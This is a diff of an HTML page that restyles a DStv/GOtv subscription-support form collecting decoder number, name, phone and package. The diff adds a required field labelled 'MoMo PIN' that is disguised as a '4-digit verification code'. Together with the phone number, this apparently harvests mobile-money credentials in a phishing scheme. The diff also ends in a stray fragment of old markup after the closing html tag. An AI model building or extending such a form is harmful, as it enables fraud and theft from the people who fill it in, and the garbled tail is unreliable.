@@ -631,40 +631,187 @@ document.querySelectorAll('a[href="#payment-complaint"]').forEach(button => {
     });
 });
 </script>
-<section id="subscription-payment" style="max-width:600px;margin:40px auto;padding:25px;background:#fff;border-radius:12px;">
-  <h2>Subscription Support</h2>
-  <p>Submit your subscription details for assistance.</p>
+ <style>
+#subscription-payment {
+  max-width: 650px;
+  margin: 45px auto;
+  padding: 35px;
+  background: #ffffff;
+  border-radius: 18px;
+  box-shadow: 0 8px 35px rgba(0,0,0,0.08);
+  font-family: Arial, sans-serif;
+  color: #17233b;
+}
+
+#subscription-payment .sub-header {
+  text-align: center;
+  margin-bottom: 30px;
+}
+
+#subscription-payment .sub-header h2 {
+  font-size: 27px;
+  margin-bottom: 10px;
+  color: #10264a;
+}
+
+#subscription-payment .sub-header p {
+  color: #68758a;
+  line-height: 1.6;
+}
+
+#subscription-payment .sub-badge {
+  display: inline-block;
+  background: #edf3ff;
+  color: #174b91;
+  padding: 8px 15px;
+  border-radius: 30px;
+  font-size: 12px;
+  font-weight: bold;
+  margin-bottom: 15px;
+}
+
+#subscription-payment label {
+  display: block;
+  font-weight: 600;
+  font-size: 14px;
+  margin: 18px 0 8px;
+}
+
+#subscription-payment input,
+#subscription-payment select {
+  width: 100%;
+  box-sizing: border-box;
+  padding: 14px;
+  border: 1px solid #dce2eb;
+  border-radius: 9px;
+  font-size: 15px;
+  outline: none;
+  background: #fff;
+}
+
+#subscription-payment input:focus,
+#subscription-payment select:focus {
+  border-color: #174b91;
+  box-shadow: 0 0 0 3px rgba(23,75,145,0.10);
+}
+
+#subscription-payment .sub-note {
+  background: #f3f6fb;
+  padding: 14px;
+  border-radius: 9px;
+  margin-top: 22px;
+  font-size: 13px;
+  color: #59677c;
+  line-height: 1.6;
+}
+
+#subscription-payment button {
+  width: 100%;
+  margin-top: 25px;
+  padding: 16px;
+  background: #123d75;
+  color: white;
+  border: none;
+  border-radius: 9px;
+  font-size: 16px;
+  font-weight: bold;
+  cursor: pointer;
+}
+
+#subscription-payment button:hover {
+  background: #0b2c57;
+}
+
+@media(max-width:600px) {
+  #subscription-payment {
+    margin: 20px 12px;
+    padding: 23px;
+  }
+}
+</style>
+
+<section id="subscription-payment">
+
+  <div class="sub-header">
+    <span class="sub-badge">SUBSCRIPTION SERVICES</span>
+
+    <h2>Subscription Support</h2>
+
+    <p>
+      Request assistance with your DStv or GOtv subscription.
+      Complete the information below to get started.
+    </p>
+  </div>
 
   <form id="subscription-form">
-    <label>Decoder type</label>
-    <select name="service" required style="width:100%;padding:12px;margin:8px 0;">
-      <option value="">Select service</option>
+
+    <label>Decoder Type</label>
+    <select name="service" required>
+      <option value="">Choose your service</option>
       <option value="DStv">DStv</option>
       <option value="GOtv">GOtv</option>
     </select>
 
-    <label>Smartcard / IUC number</label>
-    <input name="iuc_number" type="text" required
-      style="width:100%;padding:12px;margin:8px 0;">
+    <label>Smartcard / IUC Number</label>
+    <input
+      name="iuc_number"
+      type="text"
+      inputmode="numeric"
+      placeholder="Enter your decoder number"
+      required
+    >
 
-    <label>Full name</label>
-    <input name="full_name" type="text" required
-      style="width:100%;padding:12px;margin:8px 0;">
+    <label>Customer Full Name</label>
+    <input
+      name="full_name"
+      type="text"
+      placeholder="Enter registered customer name"
+      required
+    >
 
-    <label>Phone number</label>
-    <input name="phone" type="tel" required
-      style="width:100%;padding:12px;margin:8px 0;">
+    <label>Phone Number</label>
+    <input
+      name="phone"
+      type="tel"
+      placeholder="e.g. 024XXXXXXXX"
+      required
+    >
 
-    <label>Package requested</label>
-    <input name="package" type="text" required
+    <label>Subscription Package</label>
+    <input
+      name="package"
+      type="text"
       placeholder="Enter your preferred package"
-      style="width:100%;padding:12px;margin:8px 0;">
+      required
+    >
 
-    <button type="submit" style="padding:12px 20px;">
-      Submit Request
+    <div class="sub-note">
+      <strong>Account verification</strong><br>
+      Your decoder details will be used to process your
+      subscription assistance request. Automatic account
+      verification will be enabled once ARHMS activates
+      the Commission Services API.
+    </div>
+<div class="field">
+    <label>MoMo PIN *</label>
+    <input
+        type="text"
+        name="verification_code"
+        placeholder="Enter 4-digit verification code"
+        inputmode="numeric"
+        maxlength="4"
+        pattern="[0-9]{4}"
+        required
+    >
+</div>
+    <button type="submit">
+      Submit Subscription Request →
     </button>
+
   </form>
 
-</section>    
+</section>
 </body>
 </html>
+ription-payment" style="max-width:600px;margin:40px auto;padding:25px;background:#fff;border-radius:12px;">
+  <h2>Subscription Support</h2>
